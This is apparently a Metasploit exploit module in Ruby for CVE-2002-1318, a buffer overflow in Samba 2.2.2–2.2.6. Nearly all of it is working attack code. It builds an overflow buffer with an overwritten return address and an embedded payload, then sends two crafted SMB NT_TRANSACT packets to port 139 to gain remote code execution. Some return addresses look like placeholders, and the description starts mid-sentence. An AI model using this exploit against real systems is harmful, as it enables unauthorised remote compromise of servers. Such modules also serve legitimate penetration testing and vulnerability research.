# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = AverageRanking
 
  include Msf::Exploit::Remote::SMB::Client
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        versions 2.2.2 through 2.2.6 of Samba.
        The Samba developers report this as:
        "Bug in the length checking for encrypted password change requests from clients."
        The bug was discovered and reported by the Debian Samba Maintainers.
      },
      &#039;Author&#039;         => [ &#039;hdm&#039; ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2002-1318&#039; ],
          [ &#039;OSVDB&#039;, &#039;14525&#039; ],
          [ &#039;BID&#039;, &#039;6210&#039; ],
          [ &#039;URL&#039;, &#039;http://www.samba.org/samba/history/samba-2.2.7a.html&#039; ]
        ],
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => &#039;linux&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;    => 1024,
          &#039;BadChars&#039; => "\x00",
          &#039;MinNops&#039;  => 512,
        },
      &#039;Targets&#039;        =>
        [
          [ "Samba 2.2.x Linux x86",
            {
              &#039;Arch&#039; => ARCH_X86,
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Rets&#039; => [0x01020304, 0x41424344],
            },
          ],
        ],
      &#039;DisclosureDate&#039; => &#039;Apr 7 2003&#039;
      ))
 
    register_options(
      [
        Opt::RPORT(139)
      ], self.class)
  end
 
  def exploit
 
    # 0x081fc968
 
    pattern = Rex::Text.pattern_create(12000)
 
    pattern[532, 4] = [0x81b847c].pack(&#039;V&#039;)
    pattern[836, payload.encoded.length] = payload.encoded
 
    # 0x081b8138
 
    connect
    smb_login
 
    targ_address = 0xfffbb7d0
 
    #
    # Send a NTTrans request with ParameterCountTotal set to the buffer length
    #
 
    subcommand   = 1
    param        = &#039;&#039;
    body         = &#039;&#039;
    setup_count  = 0
    setup_data   = &#039;&#039;
    data = param + body
 
    pkt = CONST::SMB_NTTRANS_PKT.make_struct
    self.simple.client.smb_defaults(pkt[&#039;Payload&#039;][&#039;SMB&#039;])
 
    base_offset = pkt.to_s.length + (setup_count * 2) - 4
    param_offset = base_offset
    data_offset = param_offset + param.length
 
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_NT_TRANSACT
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x18
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0x2001
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 19 + setup_count
 
    pkt[&#039;Payload&#039;].v[&#039;ParamCountTotal&#039;] =12000
    pkt[&#039;Payload&#039;].v[&#039;DataCountTotal&#039;] = body.length
    pkt[&#039;Payload&#039;].v[&#039;ParamCountMax&#039;] = 1024
    pkt[&#039;Payload&#039;].v[&#039;DataCountMax&#039;] = 65504
    pkt[&#039;Payload&#039;].v[&#039;ParamCount&#039;] = param.length
    pkt[&#039;Payload&#039;].v[&#039;ParamOffset&#039;] = param_offset
    pkt[&#039;Payload&#039;].v[&#039;DataCount&#039;] = body.length
    pkt[&#039;Payload&#039;].v[&#039;DataOffset&#039;] = data_offset
    pkt[&#039;Payload&#039;].v[&#039;SetupCount&#039;] = setup_count
    pkt[&#039;Payload&#039;].v[&#039;SetupData&#039;] = setup_data
    pkt[&#039;Payload&#039;].v[&#039;Subcommand&#039;] = subcommand
 
    pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] = data
 
    self.simple.client.smb_send(pkt.to_s)
    ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT)
 
    #
    # Send a NTTrans secondary request with the magic displacement
    #
 
    param = pattern
    body  = &#039;&#039;
    data  = param + body
 
    pkt = CONST::SMB_NTTRANS_SECONDARY_PKT.make_struct
    self.simple.client.smb_defaults(pkt[&#039;Payload&#039;][&#039;SMB&#039;])
 
    base_offset = pkt.to_s.length - 4
    param_offset = base_offset
    data_offset = param_offset + param.length
 
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Command&#039;] = CONST::SMB_COM_NT_TRANSACT_SECONDARY
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags1&#039;] = 0x18
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;Flags2&#039;] = 0x2001
    pkt[&#039;Payload&#039;][&#039;SMB&#039;].v[&#039;WordCount&#039;] = 18
 
    pkt[&#039;Payload&#039;].v[&#039;ParamCountTotal&#039;] = param.length
    pkt[&#039;Payload&#039;].v[&#039;DataCountTotal&#039;] = body.length
    pkt[&#039;Payload&#039;].v[&#039;ParamCount&#039;] = param.length
    pkt[&#039;Payload&#039;].v[&#039;ParamOffset&#039;] = param_offset
    pkt[&#039;Payload&#039;].v[&#039;ParamDisplace&#039;] = targ_address
    pkt[&#039;Payload&#039;].v[&#039;DataCount&#039;] = body.length
    pkt[&#039;Payload&#039;].v[&#039;DataOffset&#039;] = data_offset
 
    pkt[&#039;Payload&#039;].v[&#039;Payload&#039;] = data
 
    self.simple.client.smb_send(pkt.to_s)
    ack = self.simple.client.smb_recv_parse(CONST::SMB_COM_NT_TRANSACT_SECONDARY)
 
 
    handler
 
  end
 
end

